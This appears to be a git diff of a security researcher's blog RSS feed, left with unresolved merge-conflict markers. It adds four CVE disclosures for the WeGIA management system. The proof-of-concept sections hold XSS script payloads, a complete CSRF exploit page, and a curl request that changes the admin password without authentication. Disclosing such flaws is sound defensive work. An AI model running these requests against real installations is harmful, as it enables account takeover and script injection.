@@ -5,10 +5,198 @@
         <description>Recent content in Posts on Natan Maia Morette</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
+<<<<<<< Updated upstream
         <lastBuildDate>Sat, 02 Mar 2024 00:00:00 +0000</lastBuildDate>
         <atom:link href="https://nmmorette.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
         
         <item>
+=======
+        <lastBuildDate>Fri, 06 Dec 2024 00:00:00 +0000</lastBuildDate>
+        <atom:link href="https://nmmorette.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>CVE-2024-53470:Stored XSS in gateway_pagamento.php function WeGIA</title>
+            <link>https://nmmorette.github.io/posts/2024/12/cve-2024-53470stored-xss-in-gateway_pagamento.php-function-wegia/</link>
+            <pubDate>Fri, 06 Dec 2024 00:00:00 +0000</pubDate>
+            
+            <guid>https://nmmorette.github.io/posts/2024/12/cve-2024-53470stored-xss-in-gateway_pagamento.php-function-wegia/</guid>
+            <description>CVE-2024-53470:Stored XSS in gateway_pagamento.php function Vendor WeGIA (Web Gerenciador Institucional) is an integrated management system licensed under the GNU GPL v3.0, designed to enhance administration, control, and transparency for institutions.
+https://www.wegia.org
+https://sol.sbc.org.br/index.php/latinoware/article/view/31544
+Affected Product Code Base WeGIA &amp;lt; v3.2.0
+Vulnerability Description A stored Cross-Site Scripting (XSS) vulnerability was identified in the WeGIA application. This vulnerability allows unauthorized scripts to be executed within the user&amp;rsquo;s browser context.
+POC File: gateway_pagamento.php
+Payload: &amp;lt;script&amp;gt;alert(&#39;Alert: XSS&#39;);&amp;lt;/script&amp;gt;</description>
+            <content type="html"><![CDATA[<h2 id="cve-2024-53470stored-xss-in-gateway_pagamentophp-function">CVE-2024-53470:Stored XSS in gateway_pagamento.php function</h2>
+<h2 id="vendor">Vendor</h2>
+<p>WeGIA (Web Gerenciador Institucional) is an integrated management system licensed under the GNU GPL v3.0, designed to enhance administration, control, and transparency for institutions.</p>
+<p><a href="https://www.wegia.org/" target="_blank" >https://www.wegia.org</a></p>
+<p><a href="https://sol.sbc.org.br/index.php/latinoware/article/view/31544" target="_blank" >https://sol.sbc.org.br/index.php/latinoware/article/view/31544</a></p>
+<h3 id="affected-product-code-base">Affected Product Code Base</h3>
+<p>WeGIA &lt; v3.2.0</p>
+<h2 id="vulnerability-description">Vulnerability Description</h2>
+<p>A stored Cross-Site Scripting (XSS) vulnerability was identified in the WeGIA application. This vulnerability allows unauthorized scripts to be executed within the user&rsquo;s browser context.</p>
+<h2 id="poc">POC</h2>
+<p>File: <code>gateway_pagamento.php</code></p>
+<p>Payload: <code>&lt;script&gt;alert('Alert: XSS');&lt;/script&gt;</code></p>
+<p>Endpoint: <code>id=&quot;plataforma-endpoint&quot; name=&quot;endpoint&quot;</code></p>
+<p><img src="https://github.com/user-attachments/assets/e671acdc-1ccf-49c5-9334-b105ddc4d97d" alt="image"></p>
+<p>File: <code>gateway_pagamento.php</code></p>
+<p>Payload: <code>&lt;script&gt;alert('Alert: XSS2');&lt;/script&gt;</code></p>
+<p>Endpoint: <code>id=&quot;plataforma-nome&quot; name=&quot;nome&quot;</code></p>
+<p><img src="https://github.com/user-attachments/assets/a6d07283-288b-4db5-9258-d43361810f40" alt="image"></p>
+<p>File: <code>gateway_pagamento.php</code></p>
+<p>Payload: <code>&lt;script&gt;alert('Alert: XSS3');&lt;/script&gt;</code></p>
+<p>Endpoint: <code>id=&quot;plataforma-chave&quot; name=&quot;token&quot;</code></p>
+<p><img src="https://github.com/user-attachments/assets/99287dce-2b9d-42e0-a2e8-6164cda24619" alt="image"></p>
+<h2 id="reference">Reference</h2>
+<p><a href="https://www.cve.org/CVERecord?id=CVE-2024-53470" target="_blank" >https://www.cve.org/CVERecord?id=CVE-2024-53470</a></p>
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53470" target="_blank" >https://nvd.nist.gov/vuln/detail/CVE-2024-53470</a></p>
+<h2 id="solution">Solution</h2>
+<p><a href="https://github.com/nilsonLazarin/WeGIA/issues/789" target="_blank" >https://github.com/nilsonLazarin/WeGIA/issues/789</a></p>
+<h2 id="discoverer">Discoverer</h2>
+<blockquote>
+<p><a href="https://nmmorette.github.io" target="_blank" >Natan Maia Morette</a> and <a href="https://www.linkedin.com/in/diegocbcastro/" target="_blank" >Diego Cardoso Borda Castro</a>, Nov 2024.</p>
+</blockquote>
+]]></content>
+        </item>
+        
+        <item>
+            <title>CVE-2024-53471:Stored XSS in meio_pagamento.php function WeGIA</title>
+            <link>https://nmmorette.github.io/posts/2024/12/cve-2024-53471stored-xss-in-meio_pagamento.php-function-wegia/</link>
+            <pubDate>Fri, 06 Dec 2024 00:00:00 +0000</pubDate>
+            
+            <guid>https://nmmorette.github.io/posts/2024/12/cve-2024-53471stored-xss-in-meio_pagamento.php-function-wegia/</guid>
+            <description>CVE-2024-53471:Stored XSS in meio_pagamento.php function Vendor WeGIA (Web Gerenciador Institucional) is an integrated management system licensed under the GNU GPL v3.0, designed to enhance administration, control, and transparency for institutions.
+https://www.wegia.org
+https://sol.sbc.org.br/index.php/latinoware/article/view/31544
+Affected Product Code Base WeGIA &amp;lt; v3.2.0
+Vulnerability Description A stored Cross-Site Scripting (XSS) vulnerability was identified in the WeGIA application. This vulnerability allows unauthorized scripts to be executed within the user&amp;rsquo;s browser context.
+POC File: meio_pagamento.php
+Payload: &amp;lt;script&amp;gt;alert(&#39;Alert: XSS4&#39;);&amp;lt;/script&amp;gt;</description>
+            <content type="html"><![CDATA[<h2 id="cve-2024-53471stored-xss-in-meio_pagamentophp-function">CVE-2024-53471:Stored XSS in meio_pagamento.php function</h2>
+<h2 id="vendor">Vendor</h2>
+<p>WeGIA (Web Gerenciador Institucional) is an integrated management system licensed under the GNU GPL v3.0, designed to enhance administration, control, and transparency for institutions.</p>
+<p><a href="https://www.wegia.org/" target="_blank" >https://www.wegia.org</a></p>
+<p><a href="https://sol.sbc.org.br/index.php/latinoware/article/view/31544" target="_blank" >https://sol.sbc.org.br/index.php/latinoware/article/view/31544</a></p>
+<h3 id="affected-product-code-base">Affected Product Code Base</h3>
+<p>WeGIA &lt; v3.2.0</p>
+<h2 id="vulnerability-description">Vulnerability Description</h2>
+<p>A stored Cross-Site Scripting (XSS) vulnerability was identified in the WeGIA application. This vulnerability allows unauthorized scripts to be executed within the user&rsquo;s browser context.</p>
+<h2 id="poc">POC</h2>
+<p>File: <code>meio_pagamento.php</code></p>
+<p>Payload: <code>&lt;script&gt;alert('Alert: XSS4');&lt;/script&gt;</code></p>
+<p>Endpoint: <code>id=&quot;meio-pagamento-nome&quot;;name=&quot;nome&quot;</code></p>
+<p><img src="https://github.com/user-attachments/assets/d6dedcf1-92f1-4b2c-8ea0-27ce1408c23b" alt="image"></p>
+<h2 id="reference">Reference</h2>
+<p><a href="https://www.cve.org/CVERecord?id=CVE-2024-53471" target="_blank" >https://www.cve.org/CVERecord?id=CVE-2024-53471</a></p>
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53471" target="_blank" >https://nvd.nist.gov/vuln/detail/CVE-2024-53471</a></p>
+<h2 id="solution">Solution</h2>
+<p><a href="https://github.com/nilsonLazarin/WeGIA/issues/789" target="_blank" >https://github.com/nilsonLazarin/WeGIA/issues/789</a></p>
+<h2 id="discoverer">Discoverer</h2>
+<blockquote>
+<p><a href="https://nmmorette.github.io" target="_blank" >Natan Maia Morette</a> and <a href="https://www.linkedin.com/in/diegocbcastro/" target="_blank" >Diego Cardoso Borda Castro</a>, Nov 2024.</p>
+</blockquote>
+]]></content>
+        </item>
+        
+        <item>
+            <title>CVE-2024-53472:CSRF in control.php to change password function WeGIA</title>
+            <link>https://nmmorette.github.io/posts/2024/12/cve-2024-53472csrf-in-control.php-to-change-password-function-wegia/</link>
+            <pubDate>Fri, 06 Dec 2024 00:00:00 +0000</pubDate>
+            
+            <guid>https://nmmorette.github.io/posts/2024/12/cve-2024-53472csrf-in-control.php-to-change-password-function-wegia/</guid>
+            <description>CVE-2024-53472:CSRF in control.php to change password Vendor WeGIA (Web Gerenciador Institucional) is an integrated management system licensed under the GNU GPL v3.0, designed to enhance administration, control, and transparency for institutions.
+https://www.wegia.org
+https://sol.sbc.org.br/index.php/latinoware/article/view/31544
+Affected Product Code Base WeGIA &amp;lt; v3.2.0
+Vulnerability Description A Cross-Site Request Forgery (CSRF) vulnerability was identified in the WeGIA application. This flaw enables an attacker to induce an authenticated user to perform unintended actions without their consent or awareness.</description>
+            <content type="html"><![CDATA[<h2 id="cve-2024-53472csrf-in-controlphp-to-change-password">CVE-2024-53472:CSRF in control.php to change password</h2>
+<h2 id="vendor">Vendor</h2>
+<p>WeGIA (Web Gerenciador Institucional) is an integrated management system licensed under the GNU GPL v3.0, designed to enhance administration, control, and transparency for institutions.</p>
+<p><a href="https://www.wegia.org/" target="_blank" >https://www.wegia.org</a></p>
+<p><a href="https://sol.sbc.org.br/index.php/latinoware/article/view/31544" target="_blank" >https://sol.sbc.org.br/index.php/latinoware/article/view/31544</a></p>
+<h3 id="affected-product-code-base">Affected Product Code Base</h3>
+<p>WeGIA &lt; v3.2.0</p>
+<h2 id="vulnerability-description">Vulnerability Description</h2>
+<p>A Cross-Site Request Forgery (CSRF) vulnerability was identified in the WeGIA application. This flaw enables an attacker to induce an authenticated user to perform unintended actions without their consent or awareness.</p>
+<h2 id="poc">POC</h2>
+<p>This code allows an attacker to change the password of an authenticated user without their consent by loading this malicious page while the user is logged into the application.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
+&lt;<span style="color:#f92672">head</span>&gt;
+    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>&gt;
+    &lt;<span style="color:#f92672">title</span>&gt;CSRF Exploit&lt;/<span style="color:#f92672">title</span>&gt;
+&lt;/<span style="color:#f92672">head</span>&gt;
+&lt;<span style="color:#f92672">body</span>&gt;
+    &lt;<span style="color:#f92672">script</span>&gt;
+        <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;https://demo.wegia.org/controle/control.php&#34;</span>, {
+            <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;POST&#34;</span>,
+            <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
+                <span style="color:#e6db74">&#34;Content-Type&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>,
+            },
+            <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;senha_antiga=wegia&amp;nova_senha=1234567&amp;confirmar_senha=1234567&amp;nomeClasse=FuncionarioControle&amp;metodo=alterarSenha&amp;redir=logout.php&amp;id_pessoa=1&amp;alterar=Alterar&#34;</span>
+        })
+        .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">response</span> =&gt; <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">text</span>())
+        .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">data</span> =&gt; <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">data</span>))
+        .<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">error</span> =&gt; <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#39;Error:&#39;</span>, <span style="color:#a6e22e">error</span>));
+    &lt;/<span style="color:#f92672">script</span>&gt;
+&lt;/<span style="color:#f92672">body</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><h2 id="reference">Reference</h2>
+<p><a href="https://www.cve.org/CVERecord?id=CVE-2024-53472" target="_blank" >https://www.cve.org/CVERecord?id=CVE-2024-53472</a>
+[https://nvd.nist.gov/vuln/detail/CVE-2024-53472] (<a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53472" target="_blank" >https://nvd.nist.gov/vuln/detail/CVE-2024-53472</a>)</p>
+<h2 id="solution">Solution</h2>
+<p><a href="https://github.com/nilsonLazarin/WeGIA/issues/790" target="_blank" >https://github.com/nilsonLazarin/WeGIA/issues/790</a></p>
+<h2 id="discoverer">Discoverer</h2>
+<blockquote>
+<p><a href="https://nmmorette.github.io" target="_blank" >Natan Maia Morette</a> and <a href="https://www.linkedin.com/in/diegocbcastro/" target="_blank" >Diego Cardoso Borda Castro</a>, Nov 2024.</p>
+</blockquote>
+]]></content>
+        </item>
+        
+        <item>
+            <title>CVE-2024-53473:Broken Access Control WeGIA</title>
+            <link>https://nmmorette.github.io/posts/2024/12/cve-2024-53473broken-access-control-wegia/</link>
+            <pubDate>Fri, 06 Dec 2024 00:00:00 +0000</pubDate>
+            
+            <guid>https://nmmorette.github.io/posts/2024/12/cve-2024-53473broken-access-control-wegia/</guid>
+            <description>CVE-2024-53473:Broken Access Control Vendor WeGIA (Web Gerenciador Institucional) is an integrated management system licensed under the GNU GPL v3.0, designed to enhance administration, control, and transparency for institutions.
+https://www.wegia.org
+https://sol.sbc.org.br/index.php/latinoware/article/view/31544
+Affected Product Code Base WeGIA &amp;lt; v3.2.0
+Vulnerability Description A critical vulnerability was identified in the web application WeGIa. This vulnerability allows an attacker to change the password of the admin user by sending a POST request to the control.php endpoint without requiring authentication or authorization.</description>
+            <content type="html"><![CDATA[<h2 id="cve-2024-53473broken-access-control">CVE-2024-53473:Broken Access Control</h2>
+<h2 id="vendor">Vendor</h2>
+<p>WeGIA (Web Gerenciador Institucional) is an integrated management system licensed under the GNU GPL v3.0, designed to enhance administration, control, and transparency for institutions.</p>
+<p><a href="https://www.wegia.org/" target="_blank" >https://www.wegia.org</a></p>
+<p><a href="https://sol.sbc.org.br/index.php/latinoware/article/view/31544" target="_blank" >https://sol.sbc.org.br/index.php/latinoware/article/view/31544</a></p>
+<h3 id="affected-product-code-base">Affected Product Code Base</h3>
+<p>WeGIA &lt; v3.2.0</p>
+<h2 id="vulnerability-description">Vulnerability Description</h2>
+<p>A critical vulnerability was identified in the web application WeGIa. This vulnerability allows an attacker to change the password of the admin user by sending a POST request to the control.php endpoint without requiring authentication or authorization.</p>
+<h2 id="poc">POC</h2>
+<p>Burp Request:</p>
+<p><img src="https://github.com/user-attachments/assets/56fe1fdc-30c2-4cd3-9e30-ffc826f9f13b" alt="image"></p>
+<p>Curl Request:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">curl -X POST https://demo.wegia.org/controle/control.php \
+  -H &#34;Content-Type: application/x-www-form-urlencoded&#34; \
+  -H &#34;Origin: https://demo.wegia.org&#34; \
+  --data-raw &#34;nova_senha=1234567<span style="color:#960050;background-color:#1e0010">&amp;</span>confirmar_senha=1234567<span style="color:#960050;background-color:#1e0010">&amp;</span>nomeClasse=FuncionarioControle<span style="color:#960050;background-color:#1e0010">&amp;</span>metodo=alterarSenha<span style="color:#960050;background-color:#1e0010">&amp;</span>redir=logout.php<span style="color:#960050;background-color:#1e0010">&amp;</span>id_pessoa=1<span style="color:#960050;background-color:#1e0010">&amp;</span>alterar=Alterar&#34;
+
+</code></pre></div><h2 id="reference">Reference</h2>
+<p><a href="https://github.com/nilsonLazarin/WeGIA/issues/791" target="_blank" >https://github.com/nilsonLazarin/WeGIA/issues/791</a></p>
+<p><a href="https://www.wegia.org/" target="_blank" >https://www.wegia.org</a></p>
+<p><a href="https://github.com/nilsonmori/WeGIA" target="_blank" >https://github.com/nilsonmori/WeGIA</a></p>
+<h2 id="discoverer">Discoverer</h2>
+<blockquote>
+<p><a href="https://nmmorette.github.io" target="_blank" >Natan Maia Morette</a> and <a href="https://www.linkedin.com/in/diegocbcastro/" target="_blank" >Diego Cardoso Borda Castro</a>, Nov 2024.</p>
+</blockquote>
+]]></content>
+        </item>
+        
+        <item>
+>>>>>>> Stashed changes
             <title>Hackerviser Secure Command - Warmup Stage I</title>
             <link>https://nmmorette.github.io/posts/2024/03/hackerviser-secure-command-warmup-stage-i/</link>
             <pubDate>Sat, 02 Mar 2024 00:00:00 +0000</pubDate>
